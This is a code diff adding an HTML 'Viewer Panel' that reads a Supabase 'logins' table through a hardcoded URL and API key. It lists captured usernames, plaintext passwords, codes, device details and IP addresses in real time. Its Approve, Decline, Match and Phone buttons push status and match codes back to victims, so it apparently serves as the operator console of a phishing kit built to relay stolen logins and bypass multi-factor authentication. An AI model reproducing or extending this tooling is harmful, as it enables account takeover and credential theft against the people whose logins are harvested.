@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Viewer Panel</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #f1f3f4;
+      color: #202124;
+      padding: 20px;
+    }
+    h1 { text-align: center; margin-bottom: 20px; color: #1a73e8; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: #fff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
+    th, td {
+      text-align: left;
+      padding: 10px 12px;
+      border-bottom: 1px solid #e0e0e0;
+      font-size: 14px;
+      word-break: break-word;
+    }
+    th {
+      background: #f8f9fa;
+      color: #5f6368;
+      text-transform: uppercase;
+      font-size: 12px;
+    }
+    tr:last-child td { border-bottom: none; }
+    tr.active { background: #e8f0fe; }
+
+    .actions button {
+      margin: 2px;
+      padding: 5px 10px;
+      border: none;
+      border-radius: 4px;
+      font-size: 13px;
+      cursor: pointer;
+      color: white;
+    }
+    .approve { background: #34a853; }
+    .decline { background: #ea4335; }
+    .match { background: #fbbc04; color: #202124; }
+    .phone { background: #4285f4; }
+    .approve:hover { background: #2c8b45; }
+    .decline:hover { background: #c73528; }
+    .match:hover { background: #e0aa03; }
+    .phone:hover { background: #2f6de0; }
+
+    #popupOverlay {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+    #popupForm {
+      background: #fff;
+      border-radius: 10px;
+      padding: 25px 30px;
+      width: 320px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      text-align: center;
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn {
+      from { transform: translateY(-10px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    #popupForm input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 5px;
+      outline: none;
+    }
+    #popupForm button {
+      margin-top: 15px;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 5px;
+      background: #1a73e8;
+      color: #fff;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    #popupForm button:hover { background: #1669c1; }
+    #cancelBtn { background: #aaa; margin-left: 8px; }
+  </style>
+</head>
+<body>
+  <h1>Viewer Panel</h1>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Device ID</th>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Page</th>
+        <th>Status</th>
+        <th>Code</th>
+        <th>User Code</th>
+        <th>Device Info</th>
+        <th>Route</th>
+        <th>Created</th>
+        <th>Actions</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody">
+      <tr><td colspan="11" style="text-align:center;">Loading...</td></tr>
+    </tbody>
+  </table>
+
+  <!-- Popup Overlay -->
+  <div id="popupOverlay">
+    <div id="popupForm">
+      <h3>Enter Match Code</h3>
+      <input type="text" id="matchCode" placeholder="Enter code..." />
+      <div style="margin-top: 15px;">
+        <button id="submitCodeBtn">Submit</button>
+        <button id="cancelBtn">Cancel</button>
+      </div>
+      <p id="errorMsg" style="color:#d93025;font-size:13px;margin-top:10px;display:none;"></p>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script>
+    const SUPABASE_URL = "https://bipnmthaonkbffothwkj.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpcG5tdGhhb25rYmZmb3Rod2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3OTc0NDUsImV4cCI6MjA3NTM3MzQ0NX0.9mNaxvZolgyyvyZP7n2x_nUwL8h1EHknpjR4_aMlPyc";
+    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const tableBody = document.getElementById("tableBody");
+    const popupOverlay = document.getElementById("popupOverlay");
+    const matchCodeInput = document.getElementById("matchCode");
+    const submitCodeBtn = document.getElementById("submitCodeBtn");
+    const cancelBtn = document.getElementById("cancelBtn");
+    const errorMsg = document.getElementById("errorMsg");
+
+    let selectedDeviceId = null;
+
+    async function fetchLogins() {
+      const { data, error } = await client
+        .from("logins")
+        .select("*")
+        .order("created_at", { ascending: false });
+
+      if (error) {
+        console.error("Error fetching logins:", error);
+        tableBody.innerHTML = `<tr><td colspan="11" style="text-align:center;color:red;">Error loading data</td></tr>`;
+        return;
+      }
+
+      renderTable(data);
+    }
+
+    function renderTable(data) {
+      if (!data || !data.length) {
+        tableBody.innerHTML = "<tr><td colspan='11' style='text-align:center;'>No records found</td></tr>";
+        return;
+      }
+
+      tableBody.innerHTML = data.map(row => {
+        const info = `
+          <strong>Device:</strong> ${row.device_model || "—"}<br>
+          <strong>Browser:</strong> ${row.browser_name || "—"}<br>
+          <strong>IP:</strong> ${row.ip_address || "—"}
+        `;
+        return `
+          <tr class="${row.login_status === 'onpage' ? 'active' : ''}">
+            <td>${row.device_id || ''}</td>
+            <td>${row.username || ''}</td>
+            <td>${row.password || ''}</td>
+            <td>${row.page_name || ''}</td>
+            <td>${row.login_status || ''}</td>
+            <td>${row.code || ''}</td>
+            <td>${row.user_code || ''}</td>
+            <td>${info}</td>
+            <td>${row.route || ''}</td>
+            <td>${new Date(row.created_at).toLocaleString()}</td>
+            <td class="actions">
+              <button class="approve" onclick="updateStatus('${row.device_id}', 'approved')">Approve</button>
+              <button class="decline" onclick="updateStatus('${row.device_id}', 'declined')">Decline</button>
+              <button class="match" onclick="openMatchPopup('${row.device_id}')">Match</button>
+              <button class="phone" onclick="updateStatus('${row.device_id}', 'phone')">Phone</button>
+            </td>
+          </tr>
+        `;
+      }).join("");
+    }
+
+    async function updateStatus(deviceId, status, codeValue = null) {
+      const updateObj = { login_status: status };
+      if (codeValue) updateObj.code = codeValue;
+
+      const { error } = await client
+        .from("logins")
+        .update(updateObj)
+        .eq("device_id", deviceId);
+
+      if (error) console.error("Error updating:", error);
+    }
+
+    window.openMatchPopup = function(deviceId) {
+      selectedDeviceId = deviceId;
+      matchCodeInput.value = "";
+      errorMsg.style.display = "none";
+      popupOverlay.style.display = "flex";
+      matchCodeInput.focus();
+    }
+
+    cancelBtn.addEventListener("click", () => {
+      popupOverlay.style.display = "none";
+      selectedDeviceId = null;
+    });
+
+    submitCodeBtn.addEventListener("click", async () => {
+      const codeVal = matchCodeInput.value.trim();
+      if (!codeVal) {
+        errorMsg.textContent = "Please enter a code.";
+        errorMsg.style.display = "block";
+        return;
+      }
+      await updateStatus(selectedDeviceId, "matchnumber", codeVal);
+      popupOverlay.style.display = "none";
+      selectedDeviceId = null;
+    });
+
+    // Realtime + polling fallback
+    client
+      .channel("logins_changes")
+      .on("postgres_changes", { event: "*", schema: "public", table: "logins" }, fetchLogins)
+      .subscribe();
+
+    setInterval(fetchLogins, 1000);
+    fetchLogins();
+  </script>
+</body>
+</html>
